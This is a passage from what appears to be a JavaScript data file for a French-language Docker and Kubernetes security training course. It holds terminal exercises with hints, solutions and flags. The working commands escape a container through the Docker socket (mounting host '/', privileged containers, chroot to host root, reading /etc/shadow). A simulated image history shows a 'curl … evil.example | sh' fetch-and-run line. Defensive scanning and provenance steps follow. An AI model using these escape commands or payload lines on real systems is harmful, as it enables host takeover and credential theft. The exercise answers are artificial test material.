            indice: "docker exec -it <nom> /bin/bash",
            lieu: "Hôte → intérieur du conteneur",
            invite: "root@7a1c9d:/#",
            motifs: ["^docker\\s+exec", "-it", "ctf-ch2", "(bash|sh)"],
            solution: "docker exec -it ctf-ch2-dockersock /bin/bash",
            sortie: "root@7a1c9d:/#"
          },
          {
            enonce: "Constater la présence du fichier socket dans le conteneur (fichier de type `s`).",
            indice: "ls -l /var/run/docker.sock",
            lieu: "Intérieur du conteneur ctf-ch2-dockersock (root)",
            motifs: ["^ls\\s", "-l", "docker\\.sock"],
            solution: "ls -l /var/run/docker.sock",
            sortie: "srw-rw---- 1 root docker 0 /var/run/docker.sock"
          },
          {
            enonce: "Prouver l'accès au démon avec une requête **en lecture** sur l'API (`/version`).",
            indice: "curl -s --unix-socket /var/run/docker.sock http://localhost/version",
            lieu: "Conteneur → requête exécutée par le démon de l'HÔTE",
            motifs: ["^curl", "--unix-socket", "docker\\.sock", "version"],
            solution: "curl -s --unix-socket /var/run/docker.sock http://localhost/version",
            sortie: "{\"Version\":\"27.1.1\",\"ApiVersion\":\"1.46\",\"Os\":\"linux\"}"
          }
        ]
      },

      /* ---- Niveau 2 : équivalent TP4 challenge 2 ---- */
      {
        type: "terminal",
        id: "term-sock-exploit",
        titre: "Niveau 2 — Créer un conteneur qui monte l'hôte (niveau TP)",
        terminal: "bash — hôte Debian",
        invite: "analyst@debian:~$",
        cours: "Avec l'accès au socket, on demande au démon de créer un conteneur qui monte `/` de l'hôte, on le démarre, puis on lit un fichier de l'hôte. C'est le challenge 2 du TP4.",
        exemple: {
          legende: "Créer un conteneur via l'API en montant l'hôte",
          code: "curl -s --unix-socket /var/run/docker.sock -X POST \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"Image\":\"alpine\",\"Cmd\":[\"sleep\",\"infinity\"],\"HostConfig\":{\"Binds\":[\"/:/host\"]}}' \\\n  http://localhost/containers/create?name=pwn"
        },
        intro: [
          "Same container `ctf-ch2-dockersock` with the mounted Docker socket.",
          "Goal: through the socket, create and start a new container `pwn` that mounts the host filesystem at /host, then read the host flag from it."
        ],
        accueil: "Socket exploit — 'help' for a hint, 'solution' to reveal a command.",
        objectifs: [
          {
            enonce: "Entrer dans le conteneur qui détient le socket.",
            indice: "docker exec -it <nom> /bin/bash",
            lieu: "Hôte → intérieur du conteneur",
            invite: "root@7a1c9d:/#",
            motifs: ["^docker\\s+exec", "-it", "ctf-ch2", "(bash|sh)"],
            solution: "docker exec -it ctf-ch2-dockersock /bin/bash",
            sortie: "root@7a1c9d:/#"
          },
          {
            enonce: "Créer via l'API un conteneur `pwn` (image `alpine`) qui monte `/` de l'hôte sous `/host`.",
            indice: "POST /containers/create?name=pwn avec HostConfig.Binds = [\"/:/host\"].",
            lieu: "Conteneur → ordre de création envoyé au démon de l'HÔTE",
            motifs: ["^curl", "--unix-socket", "docker\\.sock", "containers/create", "/:/host"],
            solution: "curl -s --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' -d '{\"Image\":\"alpine\",\"Cmd\":[\"sleep\",\"infinity\"],\"HostConfig\":{\"Binds\":[\"/:/host\"]}}' http://localhost/containers/create?name=pwn",
            sortie: "{\"Id\":\"b91e4d2f7a\",\"Warnings\":[]}"
          },
          {
            enonce: "Démarrer le conteneur `pwn` via l'API.",
            indice: "POST /containers/pwn/start",
            lieu: "Conteneur → ordre de démarrage au démon de l'HÔTE",
            motifs: ["^curl", "--unix-socket", "docker\\.sock", "containers/pwn/start"],
            solution: "curl -s -X POST --unix-socket /var/run/docker.sock http://localhost/containers/pwn/start",
            sortie: "(204 No Content — pwn démarré)"
          },
          {
            enonce: "Revenir sur l'hôte, puis entrer dans le nouveau conteneur `pwn`.",
            indice: "exit puis docker exec -it pwn sh — ou directement docker exec sur pwn.",
            lieu: "Hôte → intérieur du conteneur pwn",
            invite: "/ # (pwn)",
            motifs: ["^docker\\s+exec", "-it", "\\bpwn\\b", "(sh|bash)"],
            solution: "docker exec -it pwn sh",
            sortie: "/ #"
          },
          {
            enonce: "Lire le flag de l'hôte via `/host` : `/host/root/ctf_flags/flag2_dockersock.txt`.",
            indice: "cat /host/root/ctf_flags/flag2_dockersock.txt",
            lieu: "Conteneur pwn → lecture du disque de l'hôte",
            motifs: ["^cat\\s", "/host/root", "flag2"],
            solution: "cat /host/root/ctf_flags/flag2_dockersock.txt",
            sortie: "FLAG{docker_sock_is_root_on_the_host}"
          }
        ]
      },

      /* ---- Niveau 3 : plus dur — shell root de l'hôte via chroot ---- */
      {
        type: "terminal",
        id: "term-sock-chroot",
        titre: "Niveau 3 — Du socket au shell root de l'hôte (avancé)",
        terminal: "bash — hôte Debian",
        invite: "analyst@debian:~$",
        cours: "Lire un flag ne suffit pas toujours : ici on veut devenir root SUR L'HÔTE. On crée via le socket un conteneur privilégié qui monte `/`, puis on utilise `chroot /host` pour prendre l'identité root de l'hôte et lire un fichier root-only comme `/etc/shadow`.",
        exemple: {
          legende: "Devenir root de l'hôte depuis un conteneur qui monte /",
          code: "chroot /host bash   # la racine devient celle de l'hôte"
        },
        intro: [
          "Same mounted socket, but this time you want a real host-root shell, not just a file.",
          "Create a privileged container that mounts /, then chroot into the host filesystem to act as host root and read /etc/shadow. This goes one step beyond the TP."
        ],
        accueil: "Socket-to-host-root — 'help' for a hint, 'solution' to reveal a command.",
        objectifs: [
          {
            enonce: "Entrer dans le conteneur qui détient le socket.",
            indice: "docker exec -it <nom> /bin/bash",
            lieu: "Hôte → intérieur du conteneur",
            invite: "root@7a1c9d:/#",
            motifs: ["^docker\\s+exec", "-it", "ctf-ch2", "(bash|sh)"],
            solution: "docker exec -it ctf-ch2-dockersock /bin/bash",
            sortie: "root@7a1c9d:/#"
          },
          {
            enonce: "Créer via l'API un conteneur **privilégié** `pwn3` qui monte `/` de l'hôte (`Privileged: true`, `Binds: [\"/:/host\"]`).",
            indice: "Ajouter \"Privileged\":true dans HostConfig, en plus des Binds.",
            lieu: "Conteneur → création d'un conteneur privilégié par le démon de l'HÔTE",
            motifs: ["^curl", "--unix-socket", "docker\\.sock", "containers/create", "/:/host", "\"?Privileged\"?\\s*:\\s*true"],
            solution: "curl -s --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' -d '{\"Image\":\"alpine\",\"Cmd\":[\"sleep\",\"infinity\"],\"HostConfig\":{\"Binds\":[\"/:/host\"],\"Privileged\":true}}' http://localhost/containers/create?name=pwn3",
            sortie: "{\"Id\":\"f4c8a1\",\"Warnings\":[]}"
          },
          {
            enonce: "Démarrer `pwn3`.",
            indice: "POST /containers/pwn3/start",
            lieu: "Conteneur → démarrage par le démon de l'HÔTE",
            motifs: ["^curl", "--unix-socket", "docker\\.sock", "containers/pwn3/start"],
            solution: "curl -s -X POST --unix-socket /var/run/docker.sock http://localhost/containers/pwn3/start",
            sortie: "(204 No Content — pwn3 démarré)"
          },
          {
            enonce: "Revenir sur l'hôte et entrer dans `pwn3`.",
            indice: "exit puis docker exec -it pwn3 sh.",
            lieu: "Hôte → intérieur du conteneur pwn3 (privilégié)",
            invite: "/ # (pwn3)",
            motifs: ["^docker\\s+exec", "-it", "pwn3", "(sh|bash)"],
            solution: "docker exec -it pwn3 sh",
            sortie: "/ #"
          },
          {
            enonce: "Prendre l'identité **root de l'hôte** : `chroot /host` sur un shell.",
            indice: "chroot /host bash — la racine devient le système de l'hôte.",
            lieu: "Conteneur pwn3 → on devient root SUR L'HÔTE (chroot)",
            invite: "root@debian:/#",
            motifs: ["^chroot\\s", "/host", "(bash|sh)"],
            solution: "chroot /host bash",
            sortie: "root@debian:/#  (vous êtes maintenant root de l'hôte)"
          },
          {
            enonce: "Preuve d'accès root hôte : lire les empreintes de mots de passe dans `/etc/shadow`.",
            indice: "cat /etc/shadow (lisible uniquement par root).",
            lieu: "Hôte, en root (via chroot depuis pwn3)",
            motifs: ["^cat\\s", "/etc/shadow"],
            solution: "cat /etc/shadow",
            sortie: "root:$6$xxxx...:19700:0:99999:7:::\nanalyst:$6$yyyy...:19700:0:99999:7:::"
          }
        ]
      }
    ]
  });

  /* =========================================================
     GUIDE G5 — Faille pas à pas : image malveillante / supply chain
     ========================================================= */
  C.guides.push({
    id: "faille-supply-chain",
    titre: "Faille pas à pas — Image malveillante et supply chain",
    resume: "Pourquoi `docker pull` exécute du code auquel on fait aveuglément confiance, comment inspecter une image suspecte, la scanner et vérifier sa provenance. Le risque n'est pas dans le conteneur qui tourne, mais dans ce que l'on assemble.",
    duree: "25 min",
    niveau: "Intermédiaire",
    badge: "Faille pas à pas",
    prealables: [
      "Savoir lancer et inspecter un conteneur.",
      "Notions : registre public, image de base, dépendances."
    ],
    sections: [
      {
        type: "notion",
        titre: "Le principe : la confiance est la faille",
        texte: "Tirer une image (`docker pull`) revient à exécuter du code écrit par d'autres. La compromission peut venir de l'image de base, d'une dépendance tirée au build, ou d'un paquet piégé publié en amont. Ici, la surface d'attaque est la **confiance** accordée à ce que l'on assemble.",
        points: [
          "**Typosquatting** : une image (ou un paquet) au nom presque identique à l'officiel (`ngnix` au lieu de `nginx`).",
          "**CVE après coup** : une image saine le jour de sa construction devient vulnérable quand une faille est publiée plus tard sur l'un de ses composants.",
          "**Backdoor en amont** : cas `xz-utils` (2024) — une porte dérobée glissée dans `liblzma`, retrouvée jusque dans des images Docker.",
          "**Ver auto-répliquant** : cas `Shai-Hulud` (npm, 2025) — un mainteneur hameçonné, des versions piégées republiées en chaîne."
        ],
        remarque: "C'est le challenge 3 du TP4, élargi aux attaques de chaîne d'approvisionnement vues en cours."
      },
      {
        titre: "Étape 0 — Se repérer et repérer l'anormal",
        texte: "Sur l'hôte, un conteneur tourne à partir d'une image « potentiellement malveillante ». On commence par voir ce qui tourne.",
        code: "docker ps",
        sortie: "CONTAINER ID   IMAGE               NAMES\n9c2f1a0b3e77   ctf-ch3-malicious   ctf-ch3-malicious"
      },
      {
        titre: "Étape 1 — Inspecter sans exécuter aveuglément",
        texte: "Avant d'entrer, on interroge l'image elle-même : son historique de construction (les couches) et sa configuration (point d'entrée). Ces commandes n'exécutent pas l'application.",
        tableau: {
          entetes: ["Commande", "Ce qu'elle révèle"],
          lignes: [
            ["`docker history --no-trunc ctf-ch3-malicious`", "Chaque couche et la commande qui l'a créée (télécharge un binaire ? ajoute un cron ?)"],
            ["`docker inspect ctf-ch3-malicious`", "Point d'entrée, variables d'environnement, ports"],
            ["`docker diff ctf-ch3-malicious`", "Fichiers ajoutés/modifiés depuis le lancement (repère un `/opt/.hidden`)"]
          ]
        },
        code: "docker history --no-trunc ctf-ch3-malicious\ndocker diff ctf-ch3-malicious",
        remarque: "Les fichiers cachés commencent par un point : ils n'apparaissent pas sans `ls -la`. C'est une cachette classique."
      },
      {
        titre: "Étape 2 — Trouver le fichier caché",
        texte: "En entrant dans le conteneur, on liste les répertoires avec `-la` pour révéler les fichiers cachés.",
        code: "docker exec -it ctf-ch3-malicious /bin/bash\n# root@9c2f:/#\nls -la /opt\ncat /opt/.hidden/flag3.txt",
        sortie: "drwxr-xr-x  .hidden\nFLAG{never_trust_an_unscanned_image}"
      },
      {
        titre: "Étape 3 — Scanner : vulnérabilités et inventaire (SBOM)",
        texte: "On ne se fie pas à l'œil : des outils comparent les composants de l'image à des bases de vulnérabilités et en dressent l'inventaire (SBOM = liste de tous les composants et versions).",
        tableau: {
          entetes: ["Outil", "Rôle"],
          lignes: [
            ["`trivy image <img>`", "Scanne l'image et liste les CVE par gravité"],
            ["`grype <img>`", "Autre scanner de vulnérabilités (croiser les résultats)"],
            ["`syft <img>`", "Génère le SBOM : tous les paquets et leurs versions"],
            ["`cosign verify <img>`", "Vérifie la signature / provenance de l'image"]
          ]
        },
        code: "trivy image ctf-ch3-malicious\nsyft ctf-ch3-malicious",
        attention: "Un scan qui remonte une CVE critique sur un composant que vous n'utilisez même pas reste un risque : moins l'image embarque de paquets, moins elle expose de failles."
      },
      {
        type: "notion",
        titre: "Corriger : durcir la chaîne d'approvisionnement",
        texte: "On sécurise la fabrication en amont, pas seulement le conteneur qui tourne.",
        points: [
          "**Images minimales** (`distroless`, `alpine`) : moins de composants = moins de CVE.",
          "**Épingler par digest** : `image@sha256:…` plutôt qu'un tag mouvant comme `latest`.",
          "**Registres officiels et signés** ; vérifier avec `cosign`.",
          "**Scanner dans la CI/CD** (`trivy`/`grype`) et **générer un SBOM** (`syft`) à chaque build.",
          "**Ne jamais mettre de secret** (clé API, `.env`) dans une image.",
          "Contre les vers type Shai-Hulud : jetons à double authentification, versions **épinglées**, publication de confiance."
        ],
        remarque: "Devise : Build → Deploy → Run → Monitor, sécurité intégrée à chaque étape (DevSecOps). On ne découvre pas une image en production."
      }
    ]
  });

  /* =========================================================
     CHAPITRE — Image malveillante et supply chain (3 niveaux)
     ========================================================= */
  C.chapitres.push({
    id: "ch-supply-chain",
    titre: "Chapitre 4 — Image malveillante et supply chain",
    description: "Trois terminaux : trouver un fichier caché dans un conteneur, analyser l'image sans lui faire confiance (history/diff), puis scanner, inventorier (SBOM) et vérifier la provenance.",
    exercices: [

      /* ---- Niveau 1 : trouver le fichier caché ---- */
      {
        type: "terminal",
        id: "term-image-cache",
        titre: "Niveau 1 — Débusquer un fichier caché",
        terminal: "bash — hôte Debian",
        invite: "analyst@debian:~$",
        cours: "Une image peut embarquer des fichiers cachés (commençant par un point), invisibles sans `ls -la`. On repère le conteneur, on entre, on révèle le fichier caché.",
        exemple: {
          legende: "Révéler les fichiers cachés d'un dossier",
          code: "ls -la /opt   # les noms en .quelquechose sont cachés"
        },
        intro: [
          "You are `analyst` on the host. A container `ctf-ch3-malicious` runs from a suspicious image.",
          "Find the hidden file it carries: list the container, step in, reveal hidden files, read the flag."
        ],
        accueil: "Hidden-file hunt — 'help' for a hint, 'solution' to reveal a command.",
        objectifs: [
          {
            enonce: "Lister les conteneurs en cours pour repérer l'image suspecte.",
            indice: "La commande de base pour voir ce qui tourne.",
            lieu: "Hôte : VM Debian (analyst)",
            motifs: ["^docker\\s+ps"],
            solution: "docker ps",
            sortie: "CONTAINER ID   IMAGE               NAMES\n9c2f1a0b3e77   ctf-ch3-malicious   ctf-ch3-malicious"
          },
          {
            enonce: "Entrer dans le conteneur `ctf-ch3-malicious`.",
            indice: "docker exec -it <nom> /bin/bash",
            lieu: "Hôte → intérieur du conteneur",
            invite: "root@9c2f1a:/#",
            motifs: ["^docker\\s+exec", "-it", "ctf-ch3", "(bash|sh)"],
            solution: "docker exec -it ctf-ch3-malicious /bin/bash",
            sortie: "root@9c2f1a:/#"
          },
          {
            enonce: "Lister `/opt` **fichiers cachés compris** pour révéler le dossier `.hidden`.",
            indice: "L'option -la montre les entrées cachées (.).",
            lieu: "Intérieur du conteneur ctf-ch3-malicious (root)",
            motifs: ["^ls\\s", "-la", "/opt"],
            solution: "ls -la /opt",
            sortie: "total 12\ndrwxr-xr-x  3 root root  .\ndrwxr-xr-x 20 root root  ..\ndrwxr-xr-x  2 root root  .hidden"
          },
          {
            enonce: "Lire le flag caché : `/opt/.hidden/flag3.txt`.",
            indice: "cat /opt/.hidden/flag3.txt",
            lieu: "Intérieur du conteneur ctf-ch3-malicious (root)",
            motifs: ["^cat\\s", "/opt/\\.hidden/flag3"],
            solution: "cat /opt/.hidden/flag3.txt",
            sortie: "FLAG{never_trust_an_unscanned_image}"
          }
        ]
      },

      /* ---- Niveau 2 : analyser l'image sans la « croire » (TP) ---- */
      {
        type: "terminal",
        id: "term-image-analyse",
        titre: "Niveau 2 — Analyser l'image sans lui faire confiance (niveau TP)",
        terminal: "bash — hôte Debian",
        invite: "analyst@debian:~$",
        cours: "Plutôt que d'exécuter puis fouiller, on interroge l'image elle-même : historique des couches, configuration, et différences du système de fichiers. C'est l'approche alternative du challenge 3 du TP4.",
        exemple: {
          legende: "Reconstituer comment l'image a été bâtie",
          code: "docker history --no-trunc ctf-ch3-malicious"
        },
        intro: [
          "Same suspicious image, but this time analyze it from the host without trusting its runtime.",
          "Use image history, config and filesystem diff to understand what was added, then confirm the hidden payload."
        ],
        accueil: "Image analysis — 'help' for a hint, 'solution' to reveal a command.",
        objectifs: [
          {
            enonce: "Afficher l'**historique complet** des couches de l'image (commandes de build).",
            indice: "docker history --no-trunc <image>",
            lieu: "Hôte : VM Debian (analyst)",
            motifs: ["^docker\\s+history", "no-trunc", "ctf-ch3"],
            solution: "docker history --no-trunc ctf-ch3-malicious",
            sortie: "CREATED BY\nRUN mkdir -p /opt/.hidden && echo FLAG... > /opt/.hidden/flag3.txt\nRUN curl -s http://evil.example/x.sh | sh   <-- suspect\n..."
          },
          {
            enonce: "Inspecter la **configuration** de l'image (point d'entrée, variables).",
            indice: "docker inspect <image> (ou le champ .Config).",
            lieu: "Hôte : VM Debian (analyst)",
            motifs: ["^docker\\s+inspect", "ctf-ch3"],
            solution: "docker inspect ctf-ch3-malicious",
            sortie: "\"Entrypoint\": [\"/usr/local/bin/start.sh\"],\n\"Env\": [\"PATH=...\"]"
          },
          {
            enonce: "Lister les **modifications du système de fichiers** du conteneur (`docker diff`).",
            indice: "docker diff <conteneur> — A = ajouté, C = modifié, D = supprimé.",
            lieu: "Hôte : VM Debian (analyst)",
            motifs: ["^docker\\s+diff", "ctf-ch3"],
            solution: "docker diff ctf-ch3-malicious",
            sortie: "A /opt/.hidden\nA /opt/.hidden/flag3.txt\nC /var/spool/cron"
          },
          {
            enonce: "Extraire le flag **sans shell interactif**, en une seule commande depuis l'hôte.",
            indice: "docker exec <conteneur> cat <chemin> (sans -it).",
            lieu: "Hôte → commande one-shot exécutée dans le conteneur",
            motifs: ["^docker\\s+exec", "ctf-ch3", "cat", "/opt/\\.hidden/flag3"],
            interdire: ["-it\\b"],
            solution: "docker exec ctf-ch3-malicious cat /opt/.hidden/flag3.txt",
            sortie: "FLAG{never_trust_an_unscanned_image}"
          }
        ]
      },

      /* ---- Niveau 3 : scanner, SBOM, provenance (défense avancée) ---- */
      {
        type: "terminal",
        id: "term-image-scan",
        titre: "Niveau 3 — Scanner, inventorier et vérifier la provenance (avancé)",
        terminal: "bash — hôte Debian",
        invite: "analyst@debian:~$",
        cours: "La défense mature ne se fie pas à l'œil : on scanne l'image (trivy/grype), on dresse le SBOM (syft), on épingle par digest et on vérifie la signature (cosign). Objectif : détecter une dépendance piégée façon xz-utils et remédier.",
        exemple: {
          legende: "Scanner une image pour ses vulnérabilités",
          code: "trivy image ctf-ch3-malicious"
        },
        intro: [
          "Defensive side: instead of hunting a flag, treat the image as a supply-chain risk.",
          "Scan it, build its SBOM, spot a backdoored dependency (liblzma / xz), then remediate by pinning a digest and verifying a signature."
        ],
        accueil: "Supply-chain defense — 'help' for a hint, 'solution' to reveal a command.",
        objectifs: [
          {
            enonce: "Scanner l'image avec **Trivy** pour lister ses vulnérabilités.",
            indice: "trivy image <image>",
            lieu: "Hôte : VM Debian (analyst) — poste d'analyse",
            motifs: ["^trivy\\s+image", "ctf-ch3"],
            solution: "trivy image ctf-ch3-malicious",
            sortie: "liblzma5  5.6.0  CRITICAL  CVE-2024-3094  (xz backdoor)\nTotal: 1 CRITICAL, 3 HIGH"
          },
          {
            enonce: "Confirmer avec un **second scanner**, Grype.",
            indice: "grype <image>",
            lieu: "Hôte : VM Debian (analyst) — poste d'analyse",
            motifs: ["^grype\\s", "ctf-ch3"],
            solution: "grype ctf-ch3-malicious",
            sortie: "liblzma5  5.6.0  CVE-2024-3094  Critical\n(confirmé par un second outil)"
          },
          {
            enonce: "Générer le **SBOM** (inventaire des composants) avec Syft.",
            indice: "syft <image>",
            lieu: "Hôte : VM Debian (analyst) — poste d'analyse",
            motifs: ["^syft\\s", "ctf-ch3"],
            solution: "syft ctf-ch3-malicious",
            sortie: "NAME       VERSION  TYPE\nliblzma5   5.6.0    deb   <-- version piégée\nbusybox    1.36.1   apk"
          },
          {
            enonce: "Remédiation : ré-épingler l'image de base **par digest** plutôt qu'un tag mouvant.",
            indice: "docker pull alpine@sha256:<empreinte>",
            lieu: "Hôte : VM Debian (analyst) — remédiation",
            motifs: ["^docker\\s+pull", "@sha256:"],
            solution: "docker pull alpine@sha256:c5b1261d6d3e43071626931fc004f70149baeba2c8ec672bd4f27761f8e1 ",
            sortie: "alpine@sha256:c5b1261d... : Pulled (version figée, reproductible)"
          },
          {
            enonce: "Vérifier la **provenance** d'une image signée avec cosign.",
            indice: "cosign verify <image> (avec la clé/politique attendue).",
            lieu: "Hôte : VM Debian (analyst) — vérification de signature",
            motifs: ["^cosign\\s+verify"],
            solution: "cosign verify --key cosign.pub registry.example/app:1.0",
            sortie: "Verification OK : signature valide, provenance de confiance"
          }
        ]
      }
    ]
  });

  /* =========================================================
     GUIDE G6 — Se repérer dans un cluster Kubernetes
     ========================================================= */
  C.guides.push({
    id: "carte-kubernetes",
    titre: "Se repérer dans un cluster Kubernetes",
    resume: "La carte de l'arbre K8s : control-plane, nœuds workers, pods, conteneurs. Qui fait quoi, où s'exécute chaque commande, et comment `kubectl exec` vous fait « descendre » dans un pod.",
    duree: "20 min",
    niveau: "Débutant",
    prealables: [
      "Avoir manipulé Docker (conteneurs, images).",
      "Idéalement, avoir monté un cluster K3S (TP2)."
    ],
    sections: [
      {
        type: "notion",
        titre: "L'arbre, du haut vers le bas",
        texte: "Un cluster Kubernetes est une hiérarchie. Savoir à quel étage on se trouve est la première réflexe de sécurité comme d'exploitation.",
        points: [
          "**Cluster** : l'ensemble. Composé de nœuds (machines physiques ou virtuelles).",
          "**Control-plane (master)** : le cerveau. Il décide, mais n'exécute pas vos applications. On lui parle avec `kubectl`.",
          "**Nœuds workers** : les bras. Ils font tourner vos pods.",
          "**Pod** : la plus petite unité déployable. Il enveloppe un ou plusieurs **conteneurs** qui partagent réseau et volumes.",
          "**Conteneur** : votre application, à l'intérieur du pod."
        ],
        remarque: "Descente type : cluster → nœud worker → pod → conteneur → votre application."
      },
      {
        titre: "Le control-plane : qui décide",
        texte: "Ces composants tournent sur le master. Les connaître, c'est comprendre où se trouvent les données sensibles du cluster.",
        tableau: {
          entetes: ["Composant", "Rôle"],
          lignes: [
            ["`kube-apiserver`", "La porte d'entrée : toutes les commandes passent par lui (front-end de l'API)"],
            ["`etcd`", "La base clé-valeur qui stocke TOUT l'état du cluster (y compris les secrets) — cible critique"],
            ["`kube-scheduler`", "Choisit sur quel nœud placer chaque nouveau pod"],
            ["`controller-manager`", "Vérifie en continu que l'état réel = l'état désiré (boucle de réconciliation)"],
            ["`coreDNS`", "Résolution de noms interne (`svc.cluster.local`)"]
          ]
        },
        attention: "Compromettre `etcd` ou `kube-apiserver`, c'est compromettre le cluster entier. C'est pourquoi le control-plane ne doit jamais être exposé."
      },
      {
        titre: "Le nœud worker : qui exécute",
        texte: "Sur chaque worker tournent les composants qui matérialisent les pods.",
        tableau: {
          entetes: ["Composant", "Rôle"],
          lignes: [
            ["`kubelet`", "L'agent du nœud : crée et surveille les conteneurs des pods, parle à l'apiserver"],
            ["`kube-proxy`", "Programme les règles réseau pour joindre les services"],
            ["`container runtime`", "Le moteur (containerd, CRI-O…) qui lance réellement les conteneurs"]
          ]
        },
        remarque: "Un pod compromis tourne sur un worker : depuis lui, l'attaquant vise le kubelet, le token du pod, puis l'apiserver."
      },
      {
        type: "notion",
        titre: "Où s'exécute ma commande ? (le point clé)",
        texte: "La confusion classique : croire que `kubectl` « entre » quelque part. Non — il envoie un ordre au control-plane. Seul `kubectl exec` vous fait réellement descendre dans un pod.",
        points: [
          "`kubectl get/describe/apply …` → tapé depuis votre poste (l'hôte), **exécuté par le control-plane**. Votre shell ne bouge pas : l'invite reste `analyst@debian:~$`.",
          "`kubectl exec -it <pod> -- sh` → vous **descendez dans le conteneur du pod**. L'invite devient celle du pod (ex. `www-data@dvwa-7d9f:/$`).",
          "`exit` → vous **remontez** sur votre poste.",
          "Dans un pod, le dossier `/var/run/secrets/kubernetes.io/serviceaccount/` contient le **token** qui permet de reparler à l'apiserver — c'est le pivot du TP5."
        ],
        remarque: "Résumé : `kubectl` = télécommande vers le control-plane ; `kubectl exec` = ascenseur vers un pod."
      }
    ]
  });

  /* =========================================================
     CHAPITRE — Orchestrer avec Kubernetes (3 niveaux, TP2)
     ========================================================= */
  C.chapitres.push({
    id: "ch-k8s-orchestration",
    titre: "Chapitre 5 — Orchestrer avec Kubernetes",
    description: "Trois terminaux : observer un cluster (host → control-plane), déployer/exposer/scaler une application (niveau TP2), puis industrialiser avec Helm et Kustomize.",
    exercices: [

      /* ---- Niveau 1 : observer le cluster ---- */
      {
        type: "terminal",
        id: "term-k8s-observer",
        titre: "Niveau 1 — Observer un cluster",
        terminal: "bash — poste d'admin (kubectl)",
        invite: "analyst@debian:~$",
        cours: "`kubectl` se tape depuis votre poste mais parle au control-plane. On lit d'abord : nœuds, pods, détail d'un pod, journaux. Votre shell ne descend nulle part — l'invite ne change pas.",
        exemple: {
          legende: "Lister les nœuds du cluster",
          code: "kubectl get nodes"
        },
        intro: [
          "You are on an admin workstation with kubectl configured for a K3S cluster.",
          "Read-only recon: list nodes, list pods across all namespaces, inspect one pod, read its logs. Every command runs on the control-plane, not in your shell."
        ],
        accueil: "Cluster recon — 'help' for a hint, 'solution' to reveal a command.",
        objectifs: [
          {
            enonce: "Lister les **nœuds** du cluster.",
            indice: "kubectl get nodes",
            lieu: "Poste d'admin → requête au control-plane",
            motifs: ["^kubectl\\s+get\\s+nodes"],
            solution: "kubectl get nodes",
            sortie: "NAME     STATUS   ROLES                  AGE\nk3s-01   Ready    control-plane,master   10d"
          },
          {
            enonce: "Lister **tous les pods, tous namespaces**.",
            indice: "kubectl get pods -A (ou --all-namespaces).",
            lieu: "Poste d'admin → requête au control-plane",
            motifs: ["^kubectl\\s+get\\s+pods", "(-A|--all-namespaces)"],
            solution: "kubectl get pods -A",
            sortie: "NAMESPACE     NAME                    READY  STATUS\nkube-system   coredns-…               1/1    Running\ndvwa-lab      dvwa-7d9f…              1/1    Running"
          },
          {
            enonce: "Afficher le **détail** du pod DVWA (image, montages, événements).",
            indice: "kubectl describe pod <pod> -n dvwa-lab",
            lieu: "Poste d'admin → requête au control-plane",
            motifs: ["^kubectl\\s+describe\\s+pod", "-n\\s+dvwa-lab"],
            solution: "kubectl describe pod dvwa-7d9f -n dvwa-lab",
            sortie: "Name: dvwa-7d9f\nContainers:\n  dvwa: image: vulnerables/web-dvwa\nMounts: /var/run/secrets/kubernetes.io/serviceaccount"
          },
          {
            enonce: "Lire les **journaux** du pod DVWA.",
            indice: "kubectl logs <pod> -n dvwa-lab",
            lieu: "Poste d'admin → requête au control-plane",
            motifs: ["^kubectl\\s+logs", "-n\\s+dvwa-lab"],
            solution: "kubectl logs dvwa-7d9f -n dvwa-lab",
            sortie: "[apache] 10.42.0.1 - - \"GET / HTTP/1.1\" 200"
          }
        ]
      },

      /* ---- Niveau 2 : déployer / exposer / scaler (TP2) ---- */
      {
        type: "terminal",
        id: "term-k8s-deployer",
        titre: "Niveau 2 — Déployer, exposer, scaler (niveau TP2)",
        terminal: "bash — poste d'admin (kubectl)",
        invite: "analyst@debian:~$",
        cours: "Orchestrer, c'est décrire l'état voulu et laisser K8s le maintenir. On crée un namespace, on applique un Deployment, on l'expose en NodePort, on ajuste les réplicas, puis on descend dans un pod. Manifeste `deployment-flask.yaml` fourni (image digitalocean/flask-helloworld, port 5000).",
        exemple: {
          legende: "Appliquer un manifeste",
          code: "kubectl apply -f deployment-flask.yaml"
        },
        intro: [
          "You will deploy the flask-helloworld app (TP2). Manifests deployment-flask.yaml and are available in the current folder.",
          "Create the namespace, apply the Deployment, expose it, scale it, then drop into one of the pods."
        ],
        accueil: "Deploy lab — 'help' for a hint, 'solution' to reveal a command.",
        objectifs: [
          {
            enonce: "Créer le namespace `hello-world`.",
            indice: "kubectl create namespace hello-world",
            lieu: "Poste d'admin → control-plane",
            motifs: ["^kubectl\\s+create\\s+namespace", "hello-world"],
            solution: "kubectl create namespace hello-world",
            sortie: "namespace/hello-world created"
          },
          {
            enonce: "Appliquer le Deployment fourni dans le namespace.",
            indice: "kubectl apply -f deployment-flask.yaml",
            lieu: "Poste d'admin → control-plane (le scheduler place les pods)",
            motifs: ["^kubectl\\s+apply", "-f", "deployment-flask"],
            solution: "kubectl apply -f deployment-flask.yaml",
            sortie: "deployment.apps/flask-helloworld created"
          },
          {
            enonce: "Vérifier que les pods tournent dans `hello-world`.",
            indice: "kubectl get pods -n hello-world",
            lieu: "Poste d'admin → control-plane",
            motifs: ["^kubectl\\s+get\\s+pods", "-n\\s+hello-world"],
            solution: "kubectl get pods -n hello-world",
            sortie: "NAME                    READY   STATUS\nflask-helloworld-…      1/1     Running   (x5)"
          },
          {
            enonce: "Exposer le Deployment en **service NodePort** sur le port 5000.",
            indice: "kubectl expose deploy flask-helloworld --type=NodePort --port=5000 -n hello-world",
            lieu: "Poste d'admin → control-plane (kube-proxy programme le réseau)",
            motifs: ["^kubectl\\s+expose", "flask-helloworld", "NodePort", "5000", "hello-world"],
            solution: "kubectl expose deploy flask-helloworld --type=NodePort --port=5000 -n hello-world",
            sortie: "service/flask-helloworld exposed"
          },
          {
            enonce: "Passer le Deployment à **8 réplicas**.",
            indice: "kubectl scale deploy flask-helloworld --replicas=8 -n hello-world",
            lieu: "Poste d'admin → control-plane (réconciliation vers 8 pods)",
            motifs: ["^kubectl\\s+scale", "flask-helloworld", "replicas=8", "hello-world"],
            solution: "kubectl scale deploy flask-helloworld --replicas=8 -n hello-world",
            sortie: "deployment.apps/flask-helloworld scaled"
          },
          {
            enonce: "**Descendre** dans un des pods (shell interactif).",
            indice: "kubectl exec -it <pod> -n hello-world -- sh",
            lieu: "Poste d'admin → on descend DANS le pod",
            invite: "/app $ (pod flask)",
